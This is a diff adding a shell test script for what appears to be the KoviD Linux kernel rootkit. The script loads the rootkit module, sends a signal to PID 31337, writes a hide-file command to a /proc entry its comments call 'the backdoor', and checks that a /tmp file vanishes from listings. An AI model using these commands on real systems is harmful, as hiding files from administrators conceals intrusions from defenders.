@@ -1,0 +1,29 @@
+# REQUIRES: 0
+# REQUIRES: DEBUG_ONLY
+# REQUIRES: NATIVE_TESTS
+
+# RUN: bash %s > %t.log
+# RUN: FileCheck-18 --input-file=%t.log %s
+
+sudo insmod ../../../build/kovid.ko
+kill -CONT 31337
+
+# Create a test directory and file
+TEST_DIR="/tmp/test_hide_file"
+TEST_FILE="hidden_file.txt"
+mkdir -p "$TEST_DIR"
+touch "$TEST_DIR/$TEST_FILE"
+
+# Hide the file using the backdoor
+echo hide-file="$TEST_DIR/$TEST_FILE" > /proc/myprocname
+
+# Verify that the file is hidden when listing the directory
+ls "$TEST_DIR" | grep "$TEST_FILE" || echo "File is hidden"
+
+# Cleanup
+rm -rf "$TEST_DIR"
+
+# Remove the kernel module
+sudo rmmod kovid
+
+# CHECK: File is hidden
